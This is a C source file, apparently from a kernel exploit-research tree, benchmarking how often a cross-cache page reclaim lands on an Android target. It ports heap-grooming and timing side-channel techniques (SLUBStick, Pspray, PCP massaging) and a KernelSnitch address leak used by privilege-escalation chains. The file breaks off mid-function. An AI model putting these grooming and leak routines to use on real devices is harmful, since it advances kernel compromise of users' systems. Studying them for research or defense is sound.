/* How often the cross-cache placement lands, with root as the judge.
 *
 * Several chains in this tree take a page away from one allocator cache and
 * refill it from another: allocate so that a page is ours alone, leak one
 * address through a timing side channel, free the page, and reclaim it with an
 * allocation of a different size carrying bytes we chose. They all reach that
 * sequence through one shared implementation, so its landing rate is a property
 * every one of them inherits.
 *
 * None of them can measure it. Each is blind to its own placement: the bytes go
 * to an address a groom named, and the first sign of a miss is a later step
 * failing for reasons nothing can attribute. Asking a chain to check its own
 * work costs a won race per sample, which on this target is budgeted at
 * hundreds of attempts -- about one exploit per data point.
 *
 * A privileged run does not have that problem. It reads the page and sees
 * whether the payload is there. That is ground truth rather than an inference
 * through an exploit primitive: no race to win, no kernel pointer to move and
 * put back, no attempt budget, and nothing to restore. A sample costs one
 * groom.
 *
 * Root is used only to observe, and the placement performed is the shared one
 * exactly as the chains perform it -- so a change that moves this number moves
 * theirs. Nothing here escalates, and no exploit primitive is used or needed.
 */
#define _GNU_SOURCE

#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#include "../lib/spray/crosscache/crosscache.h"
#include "../lib/rw/kprobe_read.h"
#include "../lib/base/cycles.h"       /* cycle-accurate timing, SLUBStick's own probe uses the x86 equivalent */
#include "../lib/base/outcome.h"
#include "../lib/addr/pagemap.h"      /* ground-truth PFNs, in place of PCP-LOST's own kernel module */
#include "../lib/target.h"
#ifndef __ARM
#define __ARM 1
#endif
#include "../lib/leak/kernelsnitch/kernelsnitch.h"
#include "../lib/kaslr/kaslr_tracefs.h"   /* runtime text base, for judging pipe-bare */

/* The reclaiming allocation's size, and where in it the payload records the
 * page it was composed for.
 *
 * A payload built only from absolute addresses is identical whichever page it
 * lands on, so reading one back proves that some payload is present and not
 * that this one is. The page's own address can only have been written after the
 * groom named that page, which is exactly the claim under test. The offset is
 * arbitrary except that it must be inert -- nothing on this page is interpreted
 * by the kernel, so any offset inside the allocation will do. */
#ifndef BENCH_SEND_BYTES
#define BENCH_SEND_BYTES  0x8000
#endif
#ifndef BENCH_SELFNAME_OFF
#define BENCH_SELFNAME_OFF 0x7800
#endif

/* `pipe-bare` leaves no bytes of ours on the page -- it refills with real
 * pipe_buffer arrays, so the judge for it is whether the .ops field at a
 * stride of PIPE_BUFFER_SIZE reads back as the kernel's own anon_pipe_buf_ops,
 * not a self-name lookup. `struct lib_pipe_buffer` (lib/rw/pipe_rw.h) puts
 * that field at byte offset 16 into each stride. Scanning several dozen
 * strides from the block's start, rather than just one, is what tells a page
 * that is really full of these arrays apart from a coincidental single match
 * -- though an exact 8-byte equality to one specific kernel pointer is
 * already a strong signal on its own. */
#define BENCH_PIPE_BUF_OPS_FIELD_OFF 16
#ifndef BENCH_PIPE_SCAN_SLOTS
#define BENCH_PIPE_SCAN_SLOTS 64
#endif

struct tally {
    unsigned grooms;     /* the side channel produced an address        */
    unsigned no_address; /* it did not, so there was nothing to place   */
    unsigned landed;     /* the page held the payload composed for it   */
    unsigned missed;     /* it did not                                  */
    unsigned unreadable; /* the judge could not read the page at all    */
    unsigned live_obj;   /* leaked address named a live kernel object    */
    unsigned dead_obj;   /* it did not -- the address itself was wrong    */
    unsigned filler_ok;  /* the page came back to us before being filled  */
    unsigned filler_bad; /* it did not                                    */
    double   precede_secs_sum; /* total time spent in the preceding leak, if any */
};

/* --precede-leak: run bench_precede_leak() before every round's placement.
 * Off by default, so the existing table is unaffected by adding this. */
static int g_precede_leak;

/* The runtime anon_pipe_buf_ops address, resolved once in main() and read by
 * bench_judge_pipe() through every round -- 0 until then, and left 0 for a
 * run that never chose the pipe-bare method, so the leak is never paid
 * unless something will actually use it. */
static unsigned long long g_anon_pipe_buf_ops;

/* Overrides for CROSSCACHE_CFG_PANTHER_61's own defaults -- 0 means "leave the
 * default". The "padding spray" technique (saturate the receiving cache far
 * past what a single reclaim needs, so the next allocation of that size has
 * nowhere to come from but a fresh slab) and the CROSS-X/PCP-massaging line of
 * research (a freed page and the allocation meant to retake it have to agree
 * on which per-CPU list they're both using) both name volume and partial-slab
 * state as the levers; these are exactly the fields CROSSCACHE_CFG_PANTHER_61
 * already carries for that purpose, just not reachable from the command line
 * before now. */
static size_t g_pipe_drain_slabs;
static size_t g_pipe_reclaim_slabs;
static size_t g_mm_partials;

/* SLUBStick's own reported technique is a timing side channel against the
 * RECEIVING cache that detects the moment a slab is recycled, rather than
 * guessing a fixed delay and firing blind. Whether that channel is even
 * visible on this device, at this cache's size, is not established here --
 * this is the measurement that would establish it, not a working gate. Off
 * by default; when on, it times BENCH_LATENCY_SAMPLES resize cycles on a
 * throwaway pipe of the SAME target size, immediately before every round's
 * real placement, and reports the spread. Correlating those numbers against
 * that round's own verdict (LANDED/missed) is the next step, once there is
 * data to correlate; this call does not do that correlation itself. */
static int g_latency_probe;
static size_t g_calibrate_n;   /* 0: not requested. Set: run bench_calibrate_signal() alone and exit. */
static size_t g_pcp_trial_n;   /* 0: not requested. Set: run bench_pcp_trial() alone and exit. */
static unsigned g_pcp_order;   /* order for --pcp-trial; 0 matches PCP-LOST's own experiment. */
static size_t g_pcp_spray_n = 500;   /* their own main()'s spray_msgs(500) count. */
static size_t g_pspray_n;      /* 0: not requested. Set: run bench_pspray_calibrate() alone and exit. */
static size_t g_pspray_warmup; /* 0 with g_pspray_n set: use BENCH_PSPRAY_WARMUP. */
static size_t g_pspray_bytes = 64;   /* per-send size; order_size*2 matches the real reclaim's own sizing (cc_frag_len). */
#ifndef BENCH_LATENCY_SAMPLES
#define BENCH_LATENCY_SAMPLES 32
#endif

/* One resize-up/resize-down cycle's cost, in microseconds, on a pipe nobody
 * else touches -- the cheapest allocation/deallocation pair this process can
 * make from the same cache pipe-bare's reclaim draws from. Returns -1.0 if
 * the probe pipe itself could not be made, which is itself worth knowing:
 * it means the probe cannot run at all, not that it ran and saw nothing. */
static double bench_latency_sample(size_t pipe_slots)
{
    int fd[2];
    struct timespec t0, t1;

    if (pipe(fd) < 0)
        return -1.0;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    fcntl(fd[0], F_SETPIPE_SZ, pipe_slots * 4096);
    fcntl(fd[0], F_SETPIPE_SZ, 2 * 4096);
    clock_gettime(CLOCK_MONOTONIC, &t1);
    close(fd[0]); close(fd[1]);
    return (t1.tv_sec - t0.tv_sec) * 1e6 + (t1.tv_nsec - t0.tv_nsec) / 1e3;
}

static int bench_latency_cmp(const void *a, const void *b)
{
    double x = *(const double *)a, y = *(const double *)b;
    return x < y ? -1 : x > y ? 1 : 0;
}

/* Samples BENCH_LATENCY_SAMPLES cycles and prints min/p50/p90/max, in one line
 * tagged with the round so it can be lined up against that round's verdict
 * afterward. Every sample is its own fresh pipe -- a reused one would be
 * warm in a way the real reclaim's first touch of a fresh slab is not. */
static void bench_latency_probe(size_t pipe_slots, int round)
{
    double us[BENCH_LATENCY_SAMPLES];
    int n = 0;

    for (int i = 0; i < BENCH_LATENCY_SAMPLES; i++) {
        double v = bench_latency_sample(pipe_slots);
        if (v >= 0.0)
            us[n++] = v;
    }
    if (!n) {
        printf("  LATENCY_PROBE round=%d n=0 (could not even make the probe pipe)\n", round);
        return;
    }
    qsort(us, (size_t)n, sizeof(us[0]), bench_latency_cmp);
    printf("  LATENCY_PROBE round=%d n=%d min=%.1fus p50=%.1fus p90=%.1fus max=%.1fus\n",
           round, n, us[0], us[n / 2], us[n * 9 / 10], us[n - 1]);
}

/* SLUBStick's own timing side channel, ported as faithfully as this tree's
 * reclaim vehicle allows -- not the guessed, wrongly-labeled gate an earlier
 * pass built and this bench's operator caught. Read isec-tugraz/SLUBStick's
 * own exploits/userspace/timed_msg_alloc.c and exploit_signal.c before
 * changing this; what follows is transcribed from them, not paraphrased.
 *
 * Their design has two allocations running together: a REAL spray that grows
 * by one object per iteration (their `msqs[i]`, held open, never freed until
 * the end), and a SEPARATE, REUSED probe object that gets the identical
 * operation repeated on it every iteration (their `measure_spray`). Both are
 * the SAME allocation the real attack sprays with -- `add_key()` for their
 * keyring exploit -- because the signal is specific to how that exact
 * allocation's cost changes as the spray crosses a slab boundary; a probe
 * against an unrelated object measures a different cache and answers
 * nothing. Timed with `rdtsc_begin()/rdtsc_end()`, a raw cycle counter, not
 * wall-clock time -- ported here as cves/lib/base/cycles.h's `lib_cycles()`,
 * the ARM64 counterpart. Their signal is the CONSECUTIVE delta
 * (`derived_time = time - prev_time`), tested against a threshold their own
 * comment states plainly they measured (`#define THRESHOLD -800`) rather
 * than assumed -- and it is a NEGATIVE threshold: their exploit fires on a
 * SPEED-UP between consecutive probes, not a slow-down.
 *
 * That threshold is for their exact target (an x86_64 VM, kernel 6.2, the
 * add_key() failure path). It does not transfer to this device, this cache,
 * or this reclaim object, and guessing a new one would be exactly the mistake
 * this function exists to stop making. So this prints the raw consecutive
 * deltas -- every one, for every iteration -- rather than testing any of
 * them against anything. Finding this device's own threshold, if one exists,
 * is reading that output, not a number this function invents.
 *
 * `probe_bytes` matches the real reclaim's own send size (order_size*2 for
 * `stream`), so the probe measures the cache the real reclaim actually uses.
 * `n` bounds the spray -- SLUBStick's own tool sprays 8192 real objects;
 * this defaults far lower (BENCH_CALIBRATE_SPRAY) because each one here is a
 * held-open socket on a phone, not a message queue in a VM built for this,
 * and every fd this leaves open past the run is one this function must close
 * itself, since nothing else will. */
#ifndef BENCH_CALIBRATE_SPRAY
#define BENCH_CALIBRATE_SPRAY 512
#endif
static void bench_calibrate_signal(size_t probe_bytes, size_t n)
{
    int (*spray)[2] = calloc(n, sizeof(*spray));
    int probe[2] = { -1, -1 };
    unsigned char *junk = calloc(1, probe_bytes);
    uint64_t hz = lib_cycles_hz();
    uint64_t prev = 0;
    size_t made = 0;

    if (!spray || !junk) {
        printf("CALIBRATE_FAIL reason=alloc\n");
        free(spray); free(junk);
        return;
    }
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, probe) < 0) {
        printf("CALIBRATE_FAIL reason=probe_socketpair\n");
        free(spray); free(junk);
        return;
    }
    {
        int fl = fcntl(probe[0], F_GETFL, 0);
        if (fl >= 0) fcntl(probe[0], F_SETFL, fl | O_NONBLOCK);
    }

    printf("CALIBRATE_START n=%zu probe_bytes=%zu cntfrq=%llu (SLUBStick's own design: "
           "grow a real spray by one object per iteration, re-probe one reused object "
           "every iteration, print the consecutive-delta series -- no threshold applied)\n",
           n, probe_bytes, (unsigned long long)hz);

    for (size_t i = 0; i < n; i++) {
        sched_yield();   /* matches their loop's own sched_yield() before each grow */
        spray[i][0] = spray[i][1] = -1;
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, spray[i]) == 0) {
            send(spray[i][0], junk, probe_bytes, MSG_DONTWAIT);
            made++;
        }

        uint64_t t0 = lib_cycles();
        send(probe[0], junk, probe_bytes, MSG_DONTWAIT);
        uint64_t t1 = lib_cycles();
        uint64_t cur = t1 - t0;

        if (i > 0) {
            int64_t derived = (int64_t)cur - (int64_t)prev;
            double derived_ns = hz ? (double)derived * 1e9 / (double)hz : 0.0;
            printf("CALIBRATE i=%zu cycles=%llu derived=%lld derived_ns=%.1f\n",
                   i, (unsigned long long)cur, (long long)derived, derived_ns);
        }
        prev = cur;
    }

    printf("CALIBRATE_DONE sprayed=%zu/%zu -- look for where |derived| jumps well past its\n"
           "               typical size and stays changed; that index is where a slab\n"
           "               boundary was crossed, if this channel is visible here at all.\n",
           made, n);

    close(probe[0]); close(probe[1]);
    for (size_t i = 0; i < n; i++) {
        if (spray[i][0] >= 0) close(spray[i][0]);
        if (spray[i][1] >= 0) close(spray[i][1]);
    }
    free(spray);
    free(junk);
}

/* Pspray (Lee et al., "Pspray: Timing Side-Channel based Linux Kernel Heap
 * Exploitation Technique", USENIX Security 2023). No source release
 * accompanies the paper itself; this is ported from the public artifact that
 * reuses its slow-path detector, MPI-SysSec/Heap-Localization's
 * `real-world/spatial_cross_cache_attack/exploit.localization.c` (their
 * `pspray_idx`/`N_PSPRAY`/`PSPRAY_CALIBRATION`/`PSPRAY_DELTA` block).
 *
 * The idea is not SLUBStick's: nothing here re-probes a held object while a
 * separate spray grows. Every iteration times ITS OWN allocation, keeps a
 * running mean of every timing seen so far, and flags an iteration whose own
 * time is anomalously larger than that mean -- the artifact's read of the
 * paper's finding that creating a fresh slab from the page allocator
 * (SLUB's slow-path) costs far more than reusing one already partially free.
 * Their number for that gap, on the machine they measured, is thousands of
 * x86 RDTSC cycles (their own PSPRAY_DELTA is a flat 2000); nothing says that
 * number or `rdtsc`'s picosecond-scale resolution transfers to this ARM
 * target's `CNTVCT_EL0` (~40.7ns/tick per lib_cycles_hz()), so this prints
 * the raw per-iteration margin against the running mean instead of applying
 * their threshold -- the same choice bench_calibrate_signal makes above, for
 * the same reason.
 *
 * Their own per-iteration allocation is a SysV `msgsnd()` into one of
 * `N_PSPRAY` message queues that were all created with `msgget()` BEFORE this
 * timed loop starts -- so the only thing the timed span itself measures is
 * one `struct msg_msg` allocation, never queue setup. SysV IPC is not
 * configured on this device (kmalloc256-sources-blocked-on-panther), so this
 * substitutes the same held-open-socketpair primitive bench_calibrate_signal
 * already uses above -- but, to keep that same "timed span is exactly one
 * allocation call" property, all `n` socketpairs are created UP FRONT here
 * too, and the timed loop calls only `send()` on each pre-made pair in turn.
 *
 * The send size (64 bytes) is not chosen to land in any specific cache the
 * way their `0x200 - MSG_MSG_SIZE` targets kmalloc-512 -- this only asks
 * whether their running-mean-plus-margin detector finds ANY separable
 * signal on this device at all, at whatever generic cache 64 bytes lands
 * in; sizing it at a specific target is the next step, not this one. */
#ifndef BENCH_PSPRAY_SPRAY
#define BENCH_PSPRAY_SPRAY     8192   /* their own N_PSPRAY (0x2000) */
#endif
#ifndef BENCH_PSPRAY_WARMUP
#define BENCH_PSPRAY_WARMUP    4096   /* their own PSPRAY_CALIBRATION (0x1000) */
#endif
static int bench_u64_cmp(const void *a, const void *b)
{
    uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
    return (x > y) - (x < y);
}

static void bench_pspray_calibrate(size_t warmup, size_t n, size_t bytes)
{
    int (*spray)[2] = calloc(n, sizeof(*spray));
    unsigned char *junk = calloc(1, bytes);
    uint64_t *post = calloc(n, sizeof(*post));   /* post-warmup elapsed, for the Tukey pass below */
    uint64_t hz = lib_cycles_hz();
    uint64_t total = 0;
    size_t made = 0, npost = 0;

    if (!spray || !junk || !post) {
        printf("PSPRAY_FAIL reason=alloc\n");
        free(spray); free(junk); free(post);
        return;
    }
    if (warmup >= n) warmup = n > 1 ? n - 1 : 0;

    for (size_t i = 0; i < n; i++) {
        spray[i][0] = spray[i][1] = -1;
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, spray[i]) == 0)
            made++;
    }

    printf("PSPRAY_START n=%zu warmup=%zu bytes=%zu made=%zu cntfrq=%llu (Lee et al., "
           "USENIX Security 2023, slow-path detector ported from MPI-SysSec/Heap-Localization: "
           "time each spray allocation, keep a running mean, print every post-warmup "
           "iteration's margin against it -- no threshold applied)\n",
           n, warmup, bytes, made, (unsigned long long)hz);

    size_t full = 0, partial = 0, failed = 0;
    for (size_t i = 0; i < n; i++) {
        uint64_t t0 = lib_cycles();
        ssize_t r = (spray[i][0] >= 0) ? send(spray[i][0], junk, bytes, MSG_DONTWAIT) : -1;
        uint64_t t1 = lib_cycles();

        if (r == (ssize_t)bytes) full++;
        else if (r > 0) partial++;
        else failed++;

        uint64_t elapsed = t1 - t0;
        total += elapsed;

        if (i >= warmup) {
            uint64_t avg = total / (i + 1);
            int64_t margin = (int64_t)elapsed - (int64_t)avg;
            double margin_ns = hz ? (double)margin * 1e9 / (double)hz : 0.0;
            printf("PSPRAY i=%zu elapsed=%llu avg=%llu margin=%lld margin_ns=%.1f send=%zd\n",
                   i, (unsigned long long)elapsed, (unsigned long long)avg,
                   (long long)margin, margin_ns, r);
            post[npost++] = elapsed;
        }
    }

    /* A rate needs SOME split point, and the honest one available without
     * inventing a device-specific magic number is Tukey's fence -- a
     * standard, threshold-free-of-this-run's-own-scale outlier definition
     * (Q3 + 1.5*IQR over these post-warmup samples), not this device's
     * "true" slow-path cost, which is not otherwise known. */
    qsort(post, npost, sizeof(*post), bench_u64_cmp);
    size_t outliers = 0;
    double fence = 0;
    if (npost >= 4) {
        uint64_t q1 = post[npost / 4], q3 = post[(npost * 3) / 4];
        fence = (double)q3 + 1.5 * (double)(q3 - q1);
        for (size_t i = 0; i < npost; i++)
            if ((double)post[i] > fence) outliers++;
    }

    printf("PSPRAY_DONE sprayed=%zu/%zu send_full=%zu send_partial=%zu send_failed=%zu\n"
           "            tukey_fence=%.0f outliers=%zu/%zu rate=%.3f%%\n"
           "            (Tukey's fence is this run's own split point, not a portable\n"
           "            constant; their own artifact fires on margin > 2000 x86 RDTSC\n"
           "            cycles, which this device's timer does not inherit)\n",
           made, n, full, partial, failed, fence, outliers, npost,
           npost ? 100.0 * (double)outliers / (double)npost : 0.0);

    for (size_t i = 0; i < n; i++) {
        if (spray[i][0] >= 0) close(spray[i][0]);
        if (spray[i][1] >= 0) close(spray[i][1]);
    }
    free(spray);
    free(junk);
    free(post);
}

/* PCP-massaging (Migliorelli et al., "Cross-Cache Attacks for the Linux
 * Kernel via PCP Massaging", NDSS 2026), ported from the public reference
 * implementation (x0prc/PCP-LOST) as faithfully as this device's own
 * constraints allow -- not guessed, and not the same shape as the SLUBStick
 * port above, because their techniques are not the same shape. Read
 * user/pcp_test.c and kernel/pcp_probe.c before changing this.
 *
 * Their own reference implementation's timing oracle is NOT a userspace
 * side channel the way SLUBStick's is. It runs INSIDE a kernel module
 * (kernel/pcp_probe.c): `ktime_get_ns()` wraps `alloc_pages()`/
 * `__free_pages()` directly, in-kernel, and the module hands userspace both
 * the resulting PFNs and the precise timings over an ioctl. Their
 * `is_pcp(t) { return t < 2000; }` classifier and their groom() loop's whole
 * adaptive strategy depend on that privileged, in-kernel measurement --
 * there is no unprivileged equivalent in their published code, and building
 * one here without evidence it corresponds to anything would be a guess
 * dressed up as a measurement.
 *
 * What ports honestly: crosscache-bench already runs privileged (root,
 * borrowed for its own judge), so the SAME ground truth their module reports
 * -- a real PFN -- is available here via lib_pagemap_pfn(), no module needed.
 * Their groom()'s STOPPING RULE (`hits > n/2`) is kept, but computed from
 * actual PFN overlap against the previous round instead of a guessed
 * nanosecond threshold -- strictly more honest than their own classifier,
 * not a shortcut around it, since overlap is exactly the ground truth their
 * timing was a proxy FOR. Their target-cache spray (`msg_spray.c`,
 * SysV `msg_msg`) does not port: SysV IPC is not configured on this device.
 * A plain AF_UNIX send stands in -- the same
 * "force allocations in an unrelated cache" role, with a vehicle already
 * proven to work here.
 *
 * Order defaults to 0 (a single page), matching their own `alloc_pages(...,
 * 0)` exactly, so a result here is comparable to what their own experiment
 * measured, not to this tree's own order-3 reclaim. `--pcp-order N` points it
 * at a different order, including 3 (`stream`'s own order), for the further
 * question of whether the finding transfers to the reclaim this bench
 * otherwise measures -- a separate question from reproducing their result. */
#ifndef BENCH_PCP_MAX_GROOM_ROUNDS
#define BENCH_PCP_MAX_GROOM_ROUNDS 500   /* matches their groom()'s own cap */
#endif

struct bench_pcp_page { void *va; unsigned long long pfn; };

static size_t bench_pcp_alloc_n(struct bench_pcp_page *pages, size_t n, size_t bytes)
{
    size_t made = 0;
    for (size_t i = 0; i < n; i++) {
        pages[i].va = mmap(NULL, bytes, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
        if (pages[i].va == MAP_FAILED) { pages[i].va = NULL; pages[i].pfn = 0; continue; }
        *(volatile unsigned char *)pages[i].va = 0x50;   /* CROSSCACHE_FILLER_BYTE, for eyeballing */
        pages[i].pfn = lib_pagemap_pfn(getpid(), (unsigned long long)(uintptr_t)pages[i].va);
        made++;
    }
    return made;
}

static void bench_pcp_free_n(struct bench_pcp_page *pages, size_t n, size_t bytes)
{
    for (size_t i = 0; i < n; i++)
        if (pages[i].va) { munmap(pages[i].va, bytes); pages[i].va = NULL; }
}

/* How many of `b`'s PFNs also appear in `a` -- their own overlap definition
 * (nested loop over both sets), kept as they wrote it rather than optimised,
 * since n stays small enough that it does not matter and matching their
 * definition exactly matters more than the constant factor. */
static size_t bench_pcp_overlap(const struct bench_pcp_page *a, size_t na,
                                const struct bench_pcp_page *b, size_t nb)
{
    size_t overlap = 0;
    for (size_t i = 0; i < na; i++) {
        if (!a[i].pfn) continue;
        for (size_t j = 0; j < nb; j++)
            if (b[j].pfn == a[i].pfn) { overlap++; break; }
    }
    return overlap;
}

/* Their spray_msgs()/free_msgs(): force allocations in an unrelated cache
 * between the drain and the re-measure, over a vehicle proven to exist here
 * (theirs does not -- see the function comment above). */
static void bench_pcp_unrelated_spray(size_t n, size_t bytes)
{
    unsigned char *junk = calloc(1, bytes);
    if (!junk) return;
    for (size_t i = 0; i < n; i++) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) == 0) {
            send(sv[0], junk, bytes, MSG_DONTWAIT);
            close(sv[0]); close(sv[1]);
        }
    }
    free(junk);
}

/* Their groom(): repeat alloc/measure/free, adapting toward a PCP-dominant
 * state, stopping once more than half of a round's pages match the previous
 * round's (their `hits > n/2`, computed from real overlap here rather than a
 * guessed timing classifier). Returns the rounds actually run. */
static int bench_pcp_groom(struct bench_pcp_page *prev, size_t n, size_t bytes)
{
    struct bench_pcp_page *cur = calloc(n, sizeof(*cur));
    int round;

    if (!cur) return 0;
    for (round = 0; round < BENCH_PCP_MAX_GROOM_ROUNDS; round++) {
        size_t made = bench_pcp_alloc_n(cur, n, bytes);
        size_t overlap = bench_pcp_overlap(prev, n, cur, n);

        printf("PCP_GROOM round=%d made=%zu/%zu overlap_vs_prev=%zu/%zu\n",
               round, made, n, overlap, n);
        memcpy(prev, cur, n * sizeof(*cur));
        bench_pcp_free_n(cur, n, bytes);
        if (overlap > n / 2)
            break;
    }
    free(cur);
    return round + 1;
}

#ifndef BENCH_PCP_DEFAULT_N
#define BENCH_PCP_DEFAULT_N 64   /* matches their main()'s own n=64 */
#endif
static void bench_pcp_trial(size_t n, unsigned pcp_order, size_t spray_n)
{
    size_t bytes = (size_t)4096 << pcp_order;
    struct bench_pcp_page *pfns1 = calloc(n, sizeof(*pfns1));
    struct bench_pcp_page *pfns2 = calloc(n, sizeof(*pfns2));

    if (!pfns1 || !pfns2) {
        printf("PCP_TRIAL_FAIL reason=alloc\n");
        free(pfns1); free(pfns2);
        return;
    }
    printf("PCP_TRIAL_START n=%zu order=%u bytes=%zu (their own experiment used order=0; "
           "this device's SysV IPC is not configured, so the target-cache spray below is "
           "an AF_UNIX send standing in for their msg_msg one)\n", n, pcp_order, bytes);

    /* Step 1-2: baseline, then free (feeds the PCP list). */
    bench_pcp_alloc_n(pfns1, n, bytes);
    bench_pcp_free_n(pfns1, n, bytes);

    /* Step 3: groom. */
    int rounds = bench_pcp_groom(pfns1, n, bytes);

    /* Step 4: force allocations in an unrelated cache. */
    bench_pcp_unrelated_spray(spray_n, bytes);

    /* Step 5-6: reallocate, measure overlap against the ORIGINAL baseline --
     * their own cross_cache_trial() compares pfns2 against pfns1, not against
     * whatever the groom loop last saw. */
    bench_pcp_alloc_n(pfns2, n, bytes);
    size_t overlap = bench_pcp_overlap(pfns1, n, pfns2, n);
    printf("PCP_TRIAL_DONE groom_rounds=%d overlap=%zu/%zu (%.0f%%)\n",
           rounds, overlap, n, n ? 100.0 * overlap / n : 0.0);

    bench_pcp_free_n(pfns2, n, bytes);
    free(pfns1); free(pfns2);
}

/* Whether a placement's own KernelSnitch run was preceded, in the same
 * process, by an unrelated one against the identical mm_struct/order-3 slab
 * class -- and if so, how long that preceding run itself took.
 *
 * This exists to answer a specific, otherwise-unmeasured question: a chain
 * that must resolve its own address (cves/cve-2026-43049-ffwheel/ksnitch_mm.h,
 * `leak_own_mm()`) before it can ALSO place a forge through crosscache runs
 * two KernelSnitch instances back to back in one process, and nothing before
 * this established whether the second one's landing rate holds up after the
 * first has already perturbed the same allocator cache. Every other round
 * this bench runs measures the module in isolation, which is not the
 * condition such a chain actually places under.
 *
 * The body is `leak_own_mm()` verbatim -- same setup, same retry policy (none:
 * a retry there costs threads a bench that repeats this every round cannot
 * afford to leak) -- so a result here describes that exact call, not an
 * approximation of it. */
static double bench_precede_leak(void)
{
	struct timespec t0, t1;
	clock_gettime(CLOCK_MONOTONIC, &t0);

	int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
	struct kernelsnitch_shared_state *ks = kernelsnitch_setup(
		MM_STRUCT_SZ, MM_ORDER, cpu_count, kernelsnitch_collisions_wanted(), 1, 0);
	kernelsnitch_find_collisions(ks);
	if (kernelsnitch_found_collisions(ks))
		kernelsnitch_bruteforce(ks);
	kernelsnitch_release_threads(ks);
	kernelsnitch_cleanup(ks);

	clock_gettime(CLOCK_MONOTONIC, &t1);
	return (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;
}

/* A groom opens thousands of descriptors. Without headroom a later round fails
 * to open its sockets, which reads as a placement failure and is not one. */
static void raise_descriptor_limit(void)
{
    struct rlimit limit;

    if (getrlimit(RLIMIT_NOFILE, &limit) == 0) {
        limit.rlim_cur = limit.rlim_max;
        setrlimit(RLIMIT_NOFILE, &limit);
    }
}

/* Compose the payload for whichever page the groom named.
 *
 * Everything else on the page is zero. What matters is that the page records
 * its own address: a payload built only from constants is identical wherever it
 * lands, so reading one back proves some payload is present and not that this
 * one is. */
/* How many of `n` words at `addr` look like kernel pointers.
 *
 * A live kernel object of this size is full of them -- list heads, locks,
 * pointers to other structures. An address that names nothing in particular is
 * not. This is a heuristic, so the count is reported rather than turned into a
 * verdict, and the raw words go in the log for anyone who wants to disagree. */
static int bench_kptr_count(uint64_t addr, uint64_t *words, size_t n)
{
    int found = 0;

    for (size_t i = 0; i < n; i++) {
        if (lib_kprobe_read64(addr + i * sizeof(uint64_t), &words[i]))
            return -1;
        if (words[i] >= UINT64_C(0xffffff8000000000))
            found++;
    }
    return found;
}

/* Two different questions, at the only two moments each can be asked.
 *
 * A miss has two causes that look identical afterwards: the refill did not take
 * the page, or the address never named our page at all. Counting them together
 * blames the refill for what the side channel did -- and the leak's own check
 * only rejects addresses of the wrong SHAPE, as its comment says.
 *
 * At LEAKED the victim is still allocated, so reading it tests the address
 * directly. At HELD the page is held by filler, so reading it tests whether the
 * page came back -- which, for a method that leaked late, cannot be separated
 * from the address having been wrong all along. */
static void bench_inspect(enum crosscache_stage stage, uintptr_t leaked,
                          uintptr_t base, void *user)
{
    struct tally *t = user;
    uint64_t words[8] = { 0 };

    if (stage == CROSSCACHE_STAGE_LEAKED) {
        int kptrs = bench_kptr_count((uint64_t)leaked, words, 8);

        if (kptrs < 0) {
            printf("    leak-probe unreadable at 0x%016llx\n",
                   (unsigned long long)leaked);
            return;
        }
        if (kptrs >= 2)
            t->live_obj++;
        else
            t->dead_obj++;
        printf("    leaked=0x%016llx kptrs=%d/8 w0=0x%016llx w1=0x%016llx\n",
               (unsigned long long)leaked, kptrs, (unsigned long long)words[0],
               (unsigned long long)words[1]);
        return;
    }

    if (lib_kprobe_read64((uint64_t)base + BENCH_SELFNAME_OFF, &words[0]))
        return;
    if (words[0] == CROSSCACHE_FILLER_WORD)
        t->filler_ok++;
    else
        t->filler_bad++;
    printf("    held=0x%016llx filler=%s (0x%016llx)\n", (unsigned long long)base,
           words[0] == CROSSCACHE_FILLER_WORD ? "ok" : "ABSENT",
           (unsigned long long)words[0]);
}

static void bench_compose(void *page, size_t len, uintptr_t base, void *user)
{
    (void)user;
    crosscache_stamp_self(page, len, BENCH_SELFNAME_OFF, base);
}

/* Judge for `pipe-bare`: count how many of the first BENCH_PIPE_SCAN_SLOTS
 * strides at `base` carry the kernel's own anon_pipe_buf_ops in their .ops
 * field. Needs the runtime text base, resolved once by the caller and passed
 * in rather than re-leaked per round, since the leak is a several-second
 * operation this bench would otherwise pay thousands of times over. Returns
 * the match count. */
static unsigned bench_judge_pipe(uintptr_t base, unsigned long long anon_pipe_buf_ops)
{
    unsigned matches = 0;

    for (int i = 0; i < BENCH_PIPE_SCAN_SLOTS; i++) {
        uint64_t ops = 0;
        uint64_t addr = (uint64_t)base + (uint64_t)i * PIPE_BUFFER_SIZE
                       + BENCH_PIPE_BUF_OPS_FIELD_OFF;

        if (lib_kprobe_read64(addr, &ops))
            continue;
        if (ops == anon_pipe_buf_ops)
            matches++;
    }
    return matches;
}

/* One placement, judged.
 *
 * The page is read before the groom's state is released, not after. Which of
 * the `nspray` refill allocations took the page is not knowable from here, so
 * releasing all but one of them first could free the very page about to be
 * read -- scoring a higher spray count down for a reason that is an artefact of
 * the harness. Verifying first is correct for any count. */
static void bench_round(const struct crosscache_method *method,
                        const struct crosscache_request *req, int round,
                        struct tally *t)
{
    const char *verdict;
    uintptr_t base;
    uint64_t seen = 0;

    /* The runner reads forward progress from this: a groom is a long silence
     * otherwise, and silence cannot be told from a stall. */
    printf("BENCH_ROUND attempt=%d method=%s nspray=%zu\n", round, method->name,
           req->nspray);

    if (g_precede_leak) {
        double secs = bench_precede_leak();
        t->precede_secs_sum += secs;
        printf("  PRECEDE_LEAK secs=%.3f (an unrelated KernelSnitch run against the\n"
               "               same mm_struct/order-3 class, immediately before this\n"
               "               placement's own -- see bench_precede_leak's comment)\n",
               secs);
    }
    if (g_latency_probe)
        bench_latency_probe(req->cfg.pipe_slots ? req->cfg.pipe_slots : 32, round);

    base = crosscache_place_with(method, req);
    if (!base) {
        crosscache_cleanup();
        t->no_address++;
        printf("  %5d  %-19s  %s\n", round, "-", "groom produced no page");
        return;
    }

